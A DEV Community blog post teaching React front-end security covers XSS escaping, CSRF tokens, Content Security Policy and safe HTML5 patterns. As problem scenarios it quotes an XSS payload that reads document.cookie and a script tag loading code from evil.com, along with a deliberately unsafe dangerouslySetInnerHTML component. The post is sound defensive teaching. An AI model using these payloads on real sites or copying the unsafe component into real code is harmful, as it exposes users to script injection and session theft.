Implementing Security in Front-End Applications (React) - DEV Community
Forem Feed
Follow new Subforems to improve your feed
DEV Community
Follow
A space to discuss and keep up software development and manage your software career
Gamers Forem
Follow
An inclusive community for gaming enthusiasts
Future
Follow
News and discussion of science and technology such as AI, VR, cryptocurrency, quantum computing, and more.
Music Forem
Follow
From composing and gigging to gear, hot music takes, and everything in between.
DUMB DEV Community
Follow
Memes and software development shitposting
Vibe Coding Forem
Follow
Discussing AI software development, and showing off what we're building.
Popcorn Movies and TV
Follow
Movie and TV enthusiasm, criticism and everything in-between.
Design Community
Follow
Web design, graphic design and everything in-between
Maker Forem
Follow
A community for makers, hobbyists, and professionals to discuss Arduino, Raspberry Pi, 3D printing, and much more.
Scale Forem
Follow
For engineers building software at scale. We discuss architecture, cloud-native, and SRE—the hard-won lessons you can't just Google
Forem Core
Follow
Discussing the core forem open source software project — features, bugs, performance, self-hosting.
Security Forem
Follow
Your central hub for all things security. From ethical hacking and CTFs to GRC and career development, for beginners and pros alike
Open Forem
Follow
A general discussion space for the Forem community. If it doesn't have a home elsewhere, it belongs here
Crypto Forem
Follow
A collaborative community for all things Crypto—from Bitcoin to protocol development and DeFi to NFTs and market analysis.
Dropdown menu
Dropdown menu
Skip to content
Navigation menu
Search
Powered by Algolia
Search
Log in
Create account
DEV Community
Close
Add reaction
Like
Unicorn
Exploding Head
Raised Hands
Fire
Jump to Comments
Save
Boost
More...
Moderate
Copy link
Copy link
Copied to Clipboard
Share to X
Share to LinkedIn
Share to Facebook
Share to Mastodon
Report Abuse
Ashutosh Sarangi
Posted on Sep 12
Implementing Security in Front-End Applications (React)
#webdev
#javascript
#react
#security
1. Cross-Site Scripting (XSS) Prevention
XSS is a common vulnerability where an attacker injects malicious scripts into a trusted website. When a user visits the site, the script executes, potentially stealing sensitive data, session cookies, or impersonating the user.
OWASP Principle: Treat all user-provided data as untrusted. Sanitize and encode input and output to prevent code injection.
Problem Scenario: A social media application allows users to create posts. An attacker posts a comment containing the following malicious script: <script>alert(document.cookie)</script>. If the application renders this comment as-is, any user viewing it will have their session cookie exposed to the attacker.
React Implementation & Example:
React's built-in security feature for XSS prevention is its automatic escaping of content rendered in JSX. By default, React DOM escapes any values embedded in curly braces ({}) before rendering them. This means <script> tags and other malicious code are converted into strings and displayed as text, not executed as code.
// Unsafe and vulnerable way (DO NOT DO THIS)
function BadPost({ content }) {
// Using dangerouslySetInnerHTML bypasses React's escaping mechanism.
// This is a major security risk if 'content' is not sanitized.
return <div dangerouslySetInnerHTML={{ __html: content }} />;
}
// Safe and recommended way
function SafePost({ content }) {
// React automatically escapes 'content' here.
// If 'content' is "I am a post with a script <script>alert('xss')</script>",
// React renders it as a plain string, preventing the script from running.
return <div>{content}</div>;
}
Enter fullscreen mode
Exit fullscreen mode
Note on dangerouslySetInnerHTML: This attribute should be used with extreme caution and only when you have a strong reason to render raw HTML. If you must use it, ensure that the content you're injecting is sanitized on the server-side first using a library like DOMPurify.
2. Cross-Site Request Forgery (CSRF) Prevention
CSRF tricks a user into submitting a malicious request to a server on behalf of a trusted user, without their knowledge.
OWASP Principle: The most effective defense is a CSRF token. The server generates a unique, unpredictable token, includes it in a hidden form field, and verifies it with each state-changing request (POST, PUT, DELETE).
Problem Scenario: A bank website has a transfer endpoint that takes a recipient and an amount. The attacker knows this endpoint and crafts a fake website with a hidden form that automatically submits a transfer request to the bank when a user visits the page. If the user is already logged in to their bank account, the request will be authenticated and the transfer will be completed.
React Implementation & Example:
In a modern React application, this is handled on the server and within the API calls, not strictly in the front-end. The React app's role is to ensure the CSRF token is included in the requests.
Server-Side: The server generates a CSRF token and sends it to the client, typically as a cookie or in the initial page load.
Client-Side (React): The React application reads this token. For every POST, PUT, or DELETE request, the app includes the token in a custom HTTP header (e.g., X-CSRF-Token).
// Example using a CSRF token from a cookie with Axios
import axios from 'axios';
import Cookies from 'js-cookie';
const csrfToken = Cookies.get('csrf-token'); // Assuming the server sent a cookie
// Create an Axios instance to automatically include the CSRF token
const apiClient = axios.create({
headers: {
'X-CSRF-Token': csrfToken,
},
});
async function submitProtectedForm(data) {
try {
// This request will now include the CSRF token in the header
const response = await apiClient.post('/api/protected-action', data);
return response.data;
} catch (error) {
console.error('CSRF protection failed:', error);
throw error;
}
}
Enter fullscreen mode
Exit fullscreen mode
3. Content Security Policy (CSP)
CSP is an added layer of security that helps mitigate XSS and other data injection attacks. It specifies which domains the browser should consider valid sources for scripts, styles, and other resources.
OWASP Principle: Use a strong, restrictive CSP to create an "allowlist" of trusted sources. This header is sent from the server.
Problem Scenario: An attacker successfully injects a malicious script <script src="https://evil.com/malicious.js"></script>. Without a CSP, the browser will download and execute this script, as it's a valid <script> tag. With a CSP, the browser will block the request to the evil.com domain.
React Implementation & Example:
This is a server-side concern. The React front-end doesn't control the HTTP headers, but it must be configured to work within the CSP rules.
Server-Side Configuration (e.g., in express.js):
const express = require('express');
const app = express();
app.use((req, res, next) => {
// Set a Content Security Policy header
res.setHeader(
'Content-Security-Policy',
"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
);
next();
});
Enter fullscreen mode
Exit fullscreen mode
The React application must ensure all its scripts and other resources are served from a whitelisted domain ('self' in this case). If you are using a third-party CDN for fonts or libraries, you must add their domain to the CSP.
4. HTML5 Security Considerations
Modern browsers and HTML5 provide new features that, if not used carefully, can introduce vulnerabilities.
OWASP Principle: Be mindful of new HTML5 features and their security implications.
React Implementation & Example:
Sanitize APIs: Avoid using new HTML5 APIs like localStorage to store sensitive data (e.g., tokens) as they are vulnerable to XSS attacks. Store them in httpOnly cookies instead.
Sandbox <iframe>: When using <iframe> elements to embed third-party content, always use the sandbox attribute to restrict what the embedded content can do.
Prevent Tabnabbing: When opening external links with target="_blank", use rel="noopener noreferrer" to prevent the new tab from gaining control over the originating tab's window object.
// React component showing safe practices
function SafeLink({ url, text }) {
// Prevents the new tab from accessing 'window.opener' and prevents referrer information
return <a href={url} target="_blank" rel="noopener noreferrer">{text}</a>;
}
// Sandbox an iframe
function SandboxedIframe({ src }) {
return (
<iframe
src={src}
sandbox="allow-scripts allow-same-origin allow-popups"
title="sandboxed content"
></iframe>
);
}
Enter fullscreen mode
Exit fullscreen mode
Security Considerations Default Supported by React
React itself provides several security measures by default, primarily by focusing on the safe rendering of dynamic content.
Automatic Escaping of Data: As mentioned in the XSS section, React automatically escapes any dynamic values rendered within JSX. This is its single most important security feature for front-end development. It converts potentially harmful characters (<, >) into safe HTML entities, rendering them harmless.
No Direct DOM Manipulation: React's virtual DOM and component-based architecture discourage direct DOM manipulation, which is a common source of security vulnerabilities. Developers are encouraged to update the state of a component, and React handles the updates to the DOM, abstracting away a layer of potential security risks.
Component Isolation: The component model promotes separation of concerns and encapsulation. While not a direct security feature, well-designed components can help prevent security flaws from spreading across the application, as a vulnerability in one component may be contained.
OWASP Cheat Sheet Series
https://cheatsheetseries.owasp.org/
Top comments (0)
Subscribe
Personal
Trusted User
Create template
Templates let you quickly answer FAQs or store snippets for re-use.
Submit
Preview
Dismiss
Code of Conduct
•
Report abuse
Are you sure you want to hide this comment? It will become hidden in your post, but will still be visible via the comment's permalink.
Hide child comments as well
Confirm
For further actions, you may consider blocking this person and/or reporting abuse
Ashutosh Sarangi
Follow
With 11 years in Front-End Dev, I'm skilled in JavaScript, React, Redux, and TypeScript. I'm passionate about learning and Sharing knowledge
Let's grow together!
Location
Limassole, Cyprus
Education
B.Tech (IT)
Pronouns
Mr.
Work
Advance Software Developer, Amdocs
Joined
Jul 11, 2024
More from Ashutosh Sarangi
Behavioral interview Preparation
#interview
#performance
#javascript
#career
Micro Frontend Using Vite (React, Angular, Vue)
#frontend
#webdev
#programming
#javascript
Basic TypeScript for JavaScript Programmers
#typescript
#webdev
#programming
#frontend
💎 DEV Diamond Sponsors
Thank you to our Diamond Sponsors for supporting the DEV Community
Google AI is the official AI Model and Platform Partner of DEV
Neon is the official database partner of DEV
Algolia is the official search partner of DEV
DEV Community — A space to discuss and keep up software development and manage your software career
Página Inicial
DEV++
Welcome Thread
Podcasts
Videos
Tags
DEV Education Tracks
DEV Challenges
DEV Help
Advertise on DEV
DEV Showcase
Sobre
Contato
Free Postgres Database
Software comparisons
Forem Shop
Código de Conduta
Política de Privacidade
Termos de Uso
Built on Forem — the open source software that powers DEV and other inclusive communities.
Made with love and Ruby on Rails. DEV Community © 2016 - 2025.
We're a place where coders share, stay up-to-date and grow their careers.
Log in
Create account